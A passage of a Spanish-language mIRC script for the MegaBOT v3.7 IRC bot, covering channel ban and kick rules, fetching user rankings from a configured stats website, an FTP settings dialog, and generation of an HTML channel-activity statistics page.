            if ($2 !isop $hget(canales,3).item) { mode $hget(canales,3).item +bb $2 $address($2,2) | kick $hget(canales,3).item $2 Lo siento, hay canales en los que frecuentas que no son compatibles con este. }
          }
          inc %canales.ncom5
        }
      }
    }
    if (!$findtok($hget(masters,$hget(canales,4).item),$2,32)) && ($2 ison $hget(canales,4).item) && ($me isop $hget(canales,4).item) {
      %canales.ncom.tlv.1 = $iif($hget(l- $+ $hget(canales,4).item,nojoin) !isnum,0,$hget(l- $+ $hget(canales,4).item,nojoin))
      if (%canales.ncom.tlv.1 > $gettok($hget(r- $+ $hget(canales,4).item,$2),1,32)) || ($gettok($hget(r- $+ $hget(canales,4).item,$2),1,32) == $null) {
        %canales.ncom5 = 1
        while ($gettok(%CANAL.NCOM. [ $+ [ $hget(canales,4).item ] ],%canales.ncom5,32)) {
          if ($ifmatch iswm $gettok(%canales.ncom1,%canales.ncom2,32)) {
            if ($2 !isop $hget(canales,4).item) { mode $hget(canales,4).item +bb $2 $address($2,2) | kick $hget(canales,4).item $2 Lo siento, hay canales en los que frecuentas que no son compatibles con este. }
          }
          inc %canales.ncom5
        }
      }
    }
    if (!$findtok($hget(masters,$hget(canales,5).item),$2,32)) && ($2 ison $hget(canales,5).item) && ($me isop $hget(canales,5).item) {
      %canales.ncom.tlv.1 = $iif($hget(l- $+ $hget(canales,5).item,nojoin) !isnum,0,$hget(l- $+ $hget(canales,5).item,nojoin))
      if (%canales.ncom.tlv.1 > $gettok($hget(r- $+ $hget(canales,5).item,$2),1,32)) || ($gettok($hget(r- $+ $hget(canales,5).item,$2),1,32) == $null) {
        %canales.ncom5 = 1
        while ($gettok(%CANAL.NCOM. [ $+ [ $hget(canales,5).item ] ],%canales.ncom5,32)) {
          if ($ifmatch iswm $gettok(%canales.ncom1,%canales.ncom2,32)) {
            if ($2 !isop $hget(canales,5).item) { mode $hget(canales,5).item +bb $2 $address($2,2) | kick $hget(canales,5).item $2 Lo siento, hay canales en los que frecuentas que no son compatibles con este. }
          }
          inc %canales.ncom5
        }
      }
    }
    inc %canales.ncom2
  }
}
alias stats.lineas {
  if ($2 == 1) { sockclose line1 $+ $right($1,-1) $+  $+ $3 $+  $+ $4 | sockopen line1 $+ $right($1,-1) $+  $+ $3 $+  $+ $4 $gettok($remove(%Stats.WEB,http://),1,47) 80 }
  if ($2 == 2) { sockclose line2 $+ $right($1,-1) $+  $+ $3 | sockopen line2 $+ $right($1,-1) $+  $+ $3 $gettok($remove(%Stats.WEB,http://),1,47) 80 }
}
on *:sockopen:line*:{
  if ( $sockerr > 0 ) { msg $gettok($sockname,4,3) 2Stats2 No se pudo conectar con la Web. }
  elseif ($left($sockname,6) == line1) || ($left($sockname,6) == line2) {
    unsetlineas $sockname | unset %stats.line.t. $+ $sockname %stats.line.top5. $+ $sockname
    sockwrite -n $sockname GET $gettok($remove(%Stats.WEB,http://),2-,47) $+ / $+ $lower($network) $+ / $+ $lower($gettok($sockname,2,3)) $+ .html HTTP/1.0 | sockwrite -n $sockname Accept: *
    sockwrite -n $sockname User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
    sockwrite -n $sockname Host: $gettok($remove(%Stats.WEB,http://),1,47) $+ :80 | sockwrite -n $sockname $crlf
} }
on *:sockread:line*:{
  if ($left($sockname,6) == line1) || ($left($sockname,6) == line2) {
    sockread %stats.line | tokenize 32 %stats.line
    if ($left($2,10) == id="tb-1">) { set %stats.line.1. $+ $sockname $html($2) }
    if ($left($2,10) == id="tb-2">) { set %stats.line.2. $+ $sockname $remove($html($2),@,+) }
    if ($left($2,10) == id="tb-3">) { set %stats.line.3. $+ $sockname $html($2) }
    if ($left($2,10) == id="tb-4">) { set %stats.line.4. $+ $sockname $html($2-) }
    if ($left($2,10) == id="tb-5">) { set %stats.line.5. $+ $sockname $html($2-) }
    if ($left($2,10) == id="tb-6">) { set %stats.line.6. $+ $sockname $html($2-) }
    if (%stats.line.6. [ $+ [ $sockname ] ]) {
      if ($left($sockname,6) == line1) {
        if (%stats.line.2. [ $+ [ $sockname ] ] == $gettok($sockname,3,3)) {
          msg $gettok($sockname,4,3)  $+ %stats.line.2. [ $+ [ $sockname ] ] Est· en %stats.line.1. [ $+ [ $sockname ] ] posiciÛn, con12 %stats.line.3. [ $+ [ $sockname ] ] lineas, el %stats.line.4. [ $+ [ $sockname ] ] de las lineas del canal, Frase aleatoria: ( $+ %stats.line.5. [ $+ [ $sockname ] ] $+ ) $remove(%stats.line.6. [ $+ [ $sockname ] ],www.,http://)
          unsetlineas $sockname | sockclose $sockname
        }
      }
      if ($left($sockname,6) == line2) {
        inc %stats.line.t. $+ $sockname
        if (5 >= %stats.line.t. [ $+ [ $sockname ] ]) {
          set %stats.line.top5. $+ $sockname %stats.line.top5. [ $+ [ $sockname ] ]  $+ %stats.line.1. [ $+ [ $sockname ] ] $+   $+ %stats.line.2. [ $+ [ $sockname ] ] $+  12 $+ %stats.line.3. [ $+ [ $sockname ] ] lineas 03 $+ %stats.line.4. [ $+ [ $sockname ] ] $+ ,
        }
        else {
          msg $gettok($sockname,3,3) TOP5 12 $gettok($sockname,3,3) $+  $left(%stats.line.top5. [ $+ [ $sockname ] ],-1) $+ .
          unsetlineas $sockname | unset %stats.line.t. $+ $sockname %stats.line.top5. $+ $sockname | sockclose $sockname
        }
      }
      unsetlineas $sockname
    }
  }
}
on *:sockclose:line*:{
  if ($left($sockname,6) == line1) { msg $gettok($sockname,4,3)  $+ $gettok($sockname,3,3) No figura entre las 50 posiciones. }
  if ($left($sockname,6) == line2) {
    if (%stats.line.t. [ $+ [ $sockname ] ] == $null) { msg $gettok($sockname,3,3) No hay nadie en el TOP5. }
    else { msg $gettok($sockname,3,3) TOP5 12 $gettok($sockname,3,3) $+  $left(%stats.line.top5. [ $+ [ $sockname ] ],-1) $+ . }
  }
  if ($left($sockname,6) == line1) || ($left($sockname,6) == line2) { unsetlineas $sockname }
  unset %stats.line.t. $+ $sockname %stats.line.top5. $+ $sockname
}
alias unsetlineas { unset %stats.line.1. $+ $1 | unset %stats.line.2. $+ $1 | unset %stats.line.3. $+ $1 | unset %stats.line.4. $+ $1 | unset %stats.line.5. $+ $1 | unset %stats.line.6. $+ $1 }
Alias Stats { if (!$dialog(stats)) { dialog -m stats stats } }
Dialog Stats {
  Title "MegaBOT - ConfiguraciÛn de estadÌsticas"
  Size -1 -1 300 200
  BOX "Datos FTP" 1, 10 10 280 160
  TEXT "Servidor" 2, 20 30 70 20
  EDIT "" 3, 100 29 180 20,autohs,center
  TEXT "Usuario" 4, 20 52 70 20
  EDIT "" 5, 100 51 180 20,autohs,center
  TEXT "Clave" 6, 20 74 70 20
  EDIT "" 7, 100 73 180 20,autohs,center,pass
  TEXT "Puerto" 8, 20 96 70 20
  EDIT "" 9, 100 95 180 20,autohs,center
  TEXT "Directorio" 10, 20 118 70 20
  EDIT "" 11, 100 117 180 20,autohs,center
  TEXT "DirecciÛn web" 12, 20 140 70 20
  EDIT "" 13, 100 139 180 20,autohs,center
  Button "Ayuda" 14, 40 175 100 20
  Button "Cerrar" 15, 160 175 100 20,cancel
}
on *:Dialog:Stats:*:*:{
  if ($devent == init) {
    did -a $dname 9 %Stats.PORT
    did -a $dname 3 %Stats.SERV
    did -a $dname 5 %Stats.USER
    did -a $dname 7 $decode(%Stats.PASS,m)
    did -a $dname 11 %Stats.DIR
    did -a $dname 13 %Stats.WEB
  }
  if ($devent == edit) {
    if ($did == 3) { set %Stats.SERV $did(3) }
    if ($did == 5) { set %Stats.USER $did(5) }
    if ($did == 7) { set %Stats.PASS $encode($did(7),m) }
    if ($did == 9) { set %Stats.PORT $did(9) }
    if ($did == 11) { set %Stats.DIR $did(11) }
    if ($did == 13) { set %Stats.WEB $did(13) }
  }
  if ($devent == sclick) {
    if ($did == 14) { run http://maincenter.es/mc-services/megabot/3.7/manual/index.htm }
  }
  if ($devent == close) { .timerclosestats -mo 1 1 statsconf }
}
alias statsmirc.auto {
  if (%Stats.status. [ $+ [ $1 ] ] != $null) && (%Stats.status.auto. [ $+ [ $1 ] ] != $null) {
    if (%Stats.act) { .timerStats.auto. $+ $1 1 5 statsmirc.auto $1 }
    else { .timerStats.auto. $+ $1 1 $calc(%Stats.status.auto. [ $+ [ $1 ] ] * 60) statsmirc.auto $1 | statsmirc $1 %NICKB }
} }
alias stats.auto {
  if (%Stats.status. [ $+ [ $hget(canales,1).item ] ] != $null) && (%Stats.status.auto. [ $+ [ $hget(canales,1).item ] ] != $null) { .timerStats.auto. $+ $hget(canales,1).item 1 $calc(%Stats.status.auto. [ $+ [ $hget(canales,1).item ] ] * 60) statsmirc.auto $hget(canales,1).item }
  if (%Stats.status. [ $+ [ $hget(canales,2).item ] ] != $null) && (%Stats.status.auto. [ $+ [ $hget(canales,2).item ] ] != $null) { .timerStats.auto. $+ $hget(canales,2).item 1 $calc(%Stats.status.auto. [ $+ [ $hget(canales,2).item ] ] * 60) statsmirc.auto $hget(canales,2).item }
  if (%Stats.status. [ $+ [ $hget(canales,3).item ] ] != $null) && (%Stats.status.auto. [ $+ [ $hget(canales,3).item ] ] != $null) { .timerStats.auto. $+ $hget(canales,3).item 1 $calc(%Stats.status.auto. [ $+ [ $hget(canales,3).item ] ] * 60) statsmirc.auto $hget(canales,3).item }
  if (%Stats.status. [ $+ [ $hget(canales,4).item ] ] != $null) && (%Stats.status.auto. [ $+ [ $hget(canales,4).item ] ] != $null) { .timerStats.auto. $+ $hget(canales,4).item 1 $calc(%Stats.status.auto. [ $+ [ $hget(canales,4).item ] ] * 60) statsmirc.auto $hget(canales,4).item }
  if (%Stats.status. [ $+ [ $hget(canales,5).item ] ] != $null) && (%Stats.status.auto. [ $+ [ $hget(canales,5).item ] ] != $null) { .timerStats.auto. $+ $hget(canales,5).item 1 $calc(%Stats.status.auto. [ $+ [ $hget(canales,5).item ] ] * 60) statsmirc.auto $hget(canales,5).item }
}
alias stats.asc {
  if ($2 != $null) {
    if ($1 == d) { %asc.tmp.1 = 1 | unset %asc.tmp.2 | set %asc.tmp.3 $replace($2,-,$chr(32)) | while ($gettok(%asc.tmp.3,%asc.tmp.1,32) != $null) { set %asc.tmp.2 %asc.tmp.2 $+ $chr($gettok(%asc.tmp.3,%asc.tmp.1,32)) | inc %asc.tmp.1 } | return $lower(%asc.tmp.2) }
    if ($1 == e) { %asc.tmp.1 = 1 | unset %asc.tmp.2 | while ($mid($2,%asc.tmp.1,1) != $null) { set %asc.tmp.2 %asc.tmp.2 $+ - $+ $asc($lower($mid($2,%asc.tmp.1,1))) | inc %asc.tmp.1 } | return $mid(%asc.tmp.2,2,$len(%asc.tmp.2)) }
} }
alias statsmirc {
  if (%Stats.act) { msg $gettok(%Stats.act,1,32) 2ERROR:2 Ya hay una actualizaciÛn de Stats en curso, espere.. }
  else {
    statsconf
    set %Stats.act $1 $2 $lower($right($1,-1)) $+ .html
    if ($hget(Stats. $+ $1) == $null) { hmake Stats. $+ $1 9999 | if ($exists(%rHcN $+ Stats\ $+ $stats.asc(e,$1) $+ .sm) == $true) { hload Stats. $+ $1 %rHcN $+ Stats\ $+ $stats.asc(e,$1) $+ .sm } }
    if ($hget(Stats.log. $+ $1) == $null) { hmake Stats.log. $+ $1 9999 | if ($exists(%rHcN $+ Stats\log. $+ $stats.asc(e,$1) $+ .sm) == $true) { hload Stats.log. $+ $1 %rHcN $+ Stats\log. $+ $stats.asc(e,$1) $+ .sm } }
    if ($fopen(Stats. $+ $1)) { .fclose Stats. $+ $1 }
    .fopen -o Stats. $+ $1 %rHcN $+ Stats\ $+ $lower($right($1,-1)) $+ .html
    wstats $1 <!doctype html>
    wstats $1 <html>
    wstats $1 <head>
    wstats $1 <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    wstats $1 <title>MegaBOT v3.7 Stats</title>
    wstats $1 <link rel=stylesheet href="http://www.maincenter.es/webstats/css/estilo.css" type="text/css"/>
    wstats $1 </head>
    wstats $1 <body>
    wstats $1 <header>
    wstats $1 <div id="centrando">
    wstats $1 <div id="logo"></div>
    wstats $1 <div id="texto-logo">
    wstats $1 <p><br><br><a href="http://www.maincenter.es/">MegaBOT Stats</a></p>
    wstats $1 <p id="texto-logo-mini"><a href="http://www.maincenter.es/">Servicios MainCenter para redes IRC</a></p>
    wstats $1 </div>
    wstats $1 <div id="estadisticas-canal">
    wstats $1 <h1 id="titulo-info">DATOS GENERALES:</h1>
    wstats $1 <table id="info-stats">
    wstats $1 <tr id="info-header">
    wstats $1 <td id="ta-1">Estadisticas del canal:</td>
    wstats $1 <td id="ta-2"><a href=" $+ %WEB- [ $+ [ $1 ] ] $+ "> $+ $1 $+ </a></td>
    wstats $1 </tr>
    wstats $1 <tr id="info-header">
    wstats $1 <td id="ta-1">Solicitado por el usuario:</td>
    wstats $1 <td id="ta-2"> $+ $2 $+ </td>
    wstats $1 </tr>
    wstats $1 <tr id="info-header">
    wstats $1 <td id="ta-1">Servidor de conexiÛn:</td>
    wstats $1 <td id="ta-2"> $+ $server ( $+ $network $+ )</td>
    wstats $1 </tr>
    wstats $1 <tr id="info-header">
    wstats $1 <td id="ta-1">Estadisticas desde el:</td>
    wstats $1 <td id="ta-2"> $+ $hget(Stats. $+ $1,D) al $date $time $+ </td>
    wstats $1 </tr>
    wstats $1 </table>
    wstats $1 </div>
    wstats $1 </div>
    wstats $1 </header>
    wstats $1 <div id="cajaheader">
    wstats $1 <!--<div id="clearboot"><br></div>-->
    wstats $1 <div id="top-50-habladores">
    wstats $1 <h1>TOP 50 M¡S HABLADORES:</h1>
    wstats $1 <table id="top-50">
    wstats $1 <tr id="tabla-50">
    wstats $1 <td id="tba-1"></td>
    wstats $1 <td id="tba-2">NICK</td>
    wstats $1 <td id="tba-3">LÕNEAS</td>
    wstats $1 <td id="tba-4">% LÕNEAS DEL CANAL</td>
    wstats $1 <td id="tba-5">FECHA/HORA</td>
    wstats $1 <td id="tba-6">UNA DE SUS FRASES</td>
    wstats $1 </tr>
    msg $1 Actualizando estadÌsticas del canal12 $1 ...
    window -c @statshoy. $+ $1 | window -hls @statshoy. $+ $1
    window -c @statstop10. $+ $1 | window -hls @statstop10. $+ $1
    window -c @stats. $+ $1 | window -hls @stats. $+ $1
    %stats.peri = $fecha.v(lunes) $+ - $+ $fecha.v(domingo)
    dll -u %RHDl $+ WF.dll
    %stats.c = 1
    while ($hget(stats. $+ $1,%stats.c).item != $null) {
      dll %RHDl $+ WF.dll WhileFix .
      %stats.c2 = $left($hget(stats. $+ $1,%stats.c).item,-2)
      if ($right($hget(stats. $+ $1,%stats.c).item,2) === øS) {
        inc %stats.c6
        %stats.fa = $hget(stats.log. $+ $1,%stats.c2 $+ øF $+ $r(1,$iif($hget(stats.log. $+ $1,%stats.c2 $+ øF15) != $null,15,$gettok($hget(stats.log. $+ $1,%stats.c2 $+ øF),1,32))))
        aline @stats. $+ $1 $str(0,$calc($len($gettok($hget(stats. $+ $1,T),1,32)) - $len($gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),1,32)))) $+ $gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),1,32) %stats.c2 $gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),1,32) $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),1,32) ) / $gettok($hget(stats. $+ $1,T),1,32) ),1) $chr(43) $+ $gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),25,32) %stats.fa
        if ($gettok($hget(stats.log. $+ $1,%stats.c2 $+ øF),2,32) == $date) { aline @statshoy. $+ $1 $str(0,$calc($len($gettok($hget(stats. $+ $1,T),1,32)) - $len($gettok($hget(stats.log. $+ $1,%stats.c2 $+ øF),3,32)))) $+ $gettok($hget(stats.log. $+ $1,%stats.c2 $+ øF),3,32) %stats.c2 $gettok($hget(stats.log. $+ $1,%stats.c2 $+ øF),3,32) }
        if ($gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),26,32) == %stats.peri) {
          %stats.top10.lineas = $calc( $gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),9,32) + $gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),10,32) + $gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),11,32) + $gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),12,32) + $gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),13,32) + $gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),14,32) + $gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),15,32) )
          %stats.top10.lineas.canal = $calc( $gettok($hget(Stats. $+ $1,T),17,32) + $gettok($hget(Stats. $+ $1,T),18,32) + $gettok($hget(Stats. $+ $1,T),19,32) + $gettok($hget(Stats. $+ $1,T),20,32) + $gettok($hget(Stats. $+ $1,T),21,32) + $gettok($hget(Stats. $+ $1,T),22,32) + $gettok($hget(Stats. $+ $1,T),23,32) )
          aline @statstop10. $+ $1 $str(0,$calc($len($gettok($hget(stats. $+ $1,T),1,32)) - $len(%stats.top10.lineas))) $+ %stats.top10.lineas %stats.c2 %stats.top10.lineas $round($calc( $calc( 100 * %stats.top10.lineas ) / %stats.top10.lineas.canal ),1) $chr(43) $+ $gettok($hget(Stats. $+ $1,%stats.c2 $+ øS),25,32) %stats.fa
        }
      }
      inc %stats.c
    }
    %stats.gr2 = 0
    %stats.gr = $line(@stats. $+ $1,0)
    while ($line(@stats. $+ $1,%stats.gr) != $null) && (%stats.gr != 0) && (49 >= %stats.gr2) {
      %stats.gr3 = $line(@stats. $+ $1,%stats.gr)
      %stats.fa2 = " $+ $strip($gettok(%stats.gr3,8-,32)) $+ "
      inc %stats.gr2
      wstats $1 <tr>
      wstats $1 <td id="tb-1"> $+ %stats.gr2 $+ </td>
      wstats $1 <td id="tb-2"> $+ $iif($left($gettok(%stats.gr3,2,32),1) != $right($gettok($hget(Stats. $+ $1,$gettok(%stats.gr3,2,32) $+ øS),25,32),-1),$v2) $+ $gettok(%stats.gr3,2,32) $+ </td>
      wstats $1 <td id="tb-3"> $+ $nump($gettok(%stats.gr3,3,32)) $+ </td>
      wstats $1 <td id="tb-4"><div id="porcentaje" style="width: $+ $gettok(%stats.gr3,4,32) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $replace($gettok(%stats.gr3,4,32),.,$chr(44)) $+ $chr(37) $+ </div></td>
      wstats $1 <td id="tb-5"> $+ $gettok(%stats.gr3,6-7,32) $+ </td>
      wstats $1 <td id="tb-6"> $+ $left(%stats.fa2,72) $+ $iif($mid(%stats.fa2,73,1) != $null, ..") $+ </td>
      wstats $1 </tr>
      dec %stats.gr
    }
    wstats $1 </table>
    wstats $1 </div>
    wstats $1 <div id="cajaheader">
    wstats $1 <!--<div id="clearboot"><br></div>-->
    wstats $1 <div id="top-50-habladores">
    wstats $1 <h1>TOP 10 DE LA SEMANA (Periodo $replace(%stats.peri,-,$chr(32) al $chr(32)) $+ ):</h1>
    wstats $1 <table id="top-50">
    wstats $1 <tr id="tabla-50">
    wstats $1 <td id="tba-1"></td>
    wstats $1 <td id="tba-2">NICK</td>
    wstats $1 <td id="tba-3">LÕNEAS</td>
    wstats $1 <td id="tba-4">% LÕNEAS DE LA SEMANA</td>
    wstats $1 <td id="tba-5">FECHA/HORA</td>
    wstats $1 <td id="tba-6">UNA DE SUS FRASES</td>
    wstats $1 </tr>
    %stats.gr2 = 0
    %stats.gr = $line(@statstop10. $+ $1,0)
    while ($line(@statstop10. $+ $1,%stats.gr) != $null) && (%stats.gr != 0) && (9 >= %stats.gr2) {
      %stats.gr3 = $line(@statstop10. $+ $1,%stats.gr)
      %stats.fa2 = " $+ $strip($gettok(%stats.gr3,8-,32)) $+ "
      inc %stats.gr2
      wstats $1 <tr>
      wstats $1 <td id="tb-1"> $+ %stats.gr2 $+ </td>
      wstats $1 <td id="tb-2"> $+ $iif($left($gettok(%stats.gr3,2,32),1) != $right($gettok($hget(Stats. $+ $1,$gettok(%stats.gr3,2,32) $+ øS),25,32),-1),$v2) $+ $gettok(%stats.gr3,2,32) $+ </td>
      wstats $1 <td id="tb-3"> $+ $nump($gettok(%stats.gr3,3,32)) $+ </td>
      wstats $1 <td id="tb-4"><div id="porcentaje" style="width: $+ $gettok(%stats.gr3,4,32) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $replace($gettok(%stats.gr3,4,32),.,$chr(44)) $+ $chr(37) $+ </div></td>
      wstats $1 <td id="tb-5"> $+ $gettok(%stats.gr3,6-7,32) $+ </td>
      wstats $1 <td id="tb-6"> $+ $left(%stats.fa2,72) $+ $iif($mid(%stats.fa2,73,1) != $null, ..") $+ </td>
      wstats $1 </tr>
      dec %stats.gr
    }
    wstats $1 </table>
    wstats $1 </div>
    wstats $1 <div id="clearboot"><br></div>
    wstats $1 <div id="top-50-habladores">
    wstats $1 <h1>ACTIVIDAD POR FRANJAS HORARIAS (Periodo $replace(%stats.peri,-,$chr(32) al $chr(32)) $+ ):</h1>
    wstats $1 <table id="top-50">
    wstats $1 <tr id="tabla-50">
    wstats $1 <td id="tca-1">HORARIOS</td>
    wstats $1 <td id="tca-2">LÕNEAS POR HORAS</td>
    wstats $1 <td id="tca-3">PORCENTAJES</td>
    wstats $1 </tr>
    wstats $1 <tr>
    %lineas.canal.per = $calc( $gettok($hget(Stats. $+ $1,T),13,32) + $gettok($hget(Stats. $+ $1,T),14,32) + $gettok($hget(Stats. $+ $1,T),15,32) + $gettok($hget(Stats. $+ $1,T),16,32) )
    wstats $1 <td id="tc-1">00h a 06h</td>
    wstats $1 <td id="tc-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),13,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),13,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),13,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="tc-1">06h a 12h</td>
    wstats $1 <td id="tc-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),14,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),14,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),14,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="tc-1">12h a 18h</td>
    wstats $1 <td id="tc-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),15,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),15,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),15,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="tc-1">18h a 00h</td>
    wstats $1 <td id="tc-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),16,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),16,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),16,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 </table>
    wstats $1 </div>
    wstats $1 <div id="clearboot"><br></div>
    wstats $1 <div id="top-50-habladores">
    wstats $1 <h1>ACTIVIDAD SEMANAL (Periodo $replace(%stats.peri,-,$chr(32) al $chr(32)) $+ ):</h1>
    wstats $1 <table id="top-50">
    wstats $1 <tr id="tabla-50">
    wstats $1 <td id="tda-1">DÕA</td>
    wstats $1 <td id="tda-2">LÕNEAS POR DIAS</td>
    wstats $1 <td id="tda-3">PORCENTAJES</td>
    wstats $1 </tr>
    %lineas.canal.per = $calc( $gettok($hget(Stats. $+ $1,T),17,32) + $gettok($hget(Stats. $+ $1,T),18,32) + $gettok($hget(Stats. $+ $1,T),19,32) + $gettok($hget(Stats. $+ $1,T),20,32) + $gettok($hget(Stats. $+ $1,T),21,32) + $gettok($hget(Stats. $+ $1,T),22,32) + $gettok($hget(Stats. $+ $1,T),23,32) )
    wstats $1 <tr>
    wstats $1 <td id="td-1">LUNES</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),17,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),17,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),17,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="td-1">MARTES</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),18,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),18,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),18,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="td-1">MI…RCOLES</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),19,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),19,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),19,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="td-1">JUEVES</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),20,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),20,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),20,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 <tr>
    wstats $1 <td id="td-1">VIERNES</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),21,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),21,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),21,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="td-1">S¡BADO</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),22,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),22,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),22,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 <tr>
    wstats $1 <td id="td-1">DOMINGO</td>
    wstats $1 <td id="td-2"> $+ $nump($gettok($hget(Stats. $+ $1,T),23,32)) $+ </td>
    wstats $1 <td id="tc-3"><div id="porcentaje" style="width: $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),23,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ ; background-color:rgba(0,0,0,0.1); border: 1px solid rgba(0,0,0,0.1);"> $+ $round($calc( $calc( 100 * $gettok($hget(Stats. $+ $1,T),23,32) ) / %lineas.canal.per ),1) $+ $chr(37) $+ </div></td></td>
    wstats $1 </tr>
    wstats $1 </table>
    wstats $1 </div>
    wstats $1 </div>
    wstats $1 <div id="clearboot"><br></div>
    wstats $1 <div id="top-50-habladores">
